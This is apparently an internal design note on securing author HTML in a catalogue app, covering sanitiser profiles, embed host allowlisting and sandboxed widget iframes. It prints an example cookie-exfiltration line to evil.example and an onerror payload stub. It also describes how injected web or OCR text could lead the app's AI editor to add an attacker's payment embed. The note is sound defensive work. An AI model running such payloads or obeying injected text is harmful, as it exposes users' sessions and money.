# Author HTML on a published catalogue

Four places let a catalogue carry markup the app did not write. This is what
each one does today, what filters it, and the one that is still open.

It matters more than it looks: a published catalogue is served from
`/catalogues/[name]` in the same Next app as the signed-in builder, so markup
running there is same-origin with the app. In the builder's preview
(`mode: "edit"`) it runs inside the owner's authenticated session.

And the author is not always the owner. The AI editor writes all four, and it
writes them while holding text it did not get from the user: a page pulled in
by `fetchUrl`, or the OCR of a photo someone handed the owner to scan. Both are
inputs an attacker can choose.

---

## The four sinks

| Sink | Written by | How it renders | Filtered? |
|---|---|---|---|
| Text section `content` | builder, AI | `HtmlContent` → `dangerouslySetInnerHTML` | **Yes** - `text` profile |
| Catalogue `heading` | builder, AI | `HtmlContent` | **Yes** - `text` profile |
| `embedding` block `code` | builder, AI | `HtmlContent` | **Yes** - `embed` profile |
| `custom_code` block `code` | builder, AI | sandboxed iframe, opaque origin | **Isolated**, not filtered |

### The three that are filtered

`helpers/sanitizeHtml.ts` runs inside `components/general/HtmlContent.tsx`, the
one component where author HTML becomes live DOM. Filtering there rather than
at each call site covers the AI, the builder, imported catalogues and rows that
predate any of this, in one place. It runs on the server too, so the SSR output
is already clean and text sections keep their SEO value.

It is an allowlist, so `on*` handlers, `<script>`, `<form>`, `<svg>`,
`<object>` and everything else unnamed are gone without being enumerated. The
`embed` profile additionally permits `<iframe>`, restricted to the hosts in
`EMBED_HOSTS` - matched as an exact host or a `.host` suffix, so
`player.vimeo.com` passes and `youtube.com.evil.example` does not.

Before this, `<img src=x onerror=...>` in any of the three reached the page
intact. Note that the code gate's old advice made this worse rather than
better: when it blocked a widget it told the model to *"add what you found as a
text or category section instead"* - routing page-derived content into an
equally unfiltered sink.

### The one that is isolated instead

`custom_code` does not go through `HtmlContent` and is not filtered at all. It
is arbitrary HTML, CSS and JavaScript, and running it is the feature -
interactive widgets, games, calculators.

**A source-text allowlist cannot secure that.** Inline `<script>` is the whole
point, so stripping `<script src>` and `fetch` is cosmetic - one line defeats
it:

```js
new Image().src = "https://evil.example/?c=" + document.cookie;
```

There is no filter over JavaScript source that fixes this while still letting
widgets run. So the control is isolation. `CustomCode.tsx` renders the fragment
into an iframe as `sandbox="allow-scripts"` **without** `allow-same-origin`,
which gives it an opaque origin.

Verified in Chromium rather than in jsdom, because this is the kind of claim a
fake DOM will happily agree with:

| Probe, from inside the frame | Result |
|---|---|
| `document.cookie` | threw |
| `parent.document.title` | threw |
| `localStorage.setItem` | threw |
| `iframe.contentDocument`, from the parent | `null` |
| the widget's own inline script | ran |
| height reported out, frame resized | 200px → 690px |

**Never add `allow-same-origin`.** Paired with `allow-scripts` it lets the frame
reach out and remove its own sandbox attribute, which undoes all of the above.

Two things the frame does not inherit, both handled in `buildWidgetDocument`:

- **Height.** An iframe does not size to its content, so the document carries a
  reporter that posts its height to the parent. The parent matches on
  `event.source`, not origin - a sandboxed frame posts with origin `"null"`, so
  origin is worth nothing here. Heights are clamped at 5000px.
- **Theme.** The catalogue's font is read from the host element and written into
  the document, along with `--catalogue-font-body` and `--catalogue-font-heading`
  so a fragment written against them still resolves.

With the fragment isolated, `requireNoWebCode` had nothing left to protect and
is gone. Reading a page and building a widget in the same conversation works.

---

## What is left

**An embed the user never supplied.** `EMBED_HOSTS` restricts which hosts an
iframe may point at, but not what lives there, and the list includes
`stripe.com` and `paypal.com`. A page read by `fetchUrl` could in principle talk
the agent into a payment embed pointing at an account the owner does not
control.

What stands against it today is prompt-level - `webRules` says a page can never
be the source of an embed, and payment, booking and checkout embeds especially
must come from the user - plus the fact that an embed is visible in the builder
and the owner still presses Publish. That is weaker than a hard gate. If it
proves too weak, the narrow fix is to refuse `embedding` specifically once
`fetchUrl` has run in the same request, which is roughly the old gate minus the
part that blocked widgets.

**Content the model gets wrong under injection** - a price changed because a
page said so, an item nobody asked for. Nothing here addresses that; it is what
the untrusted-text rules in the prompt are for, and it is a much lower-severity
outcome than executable markup.
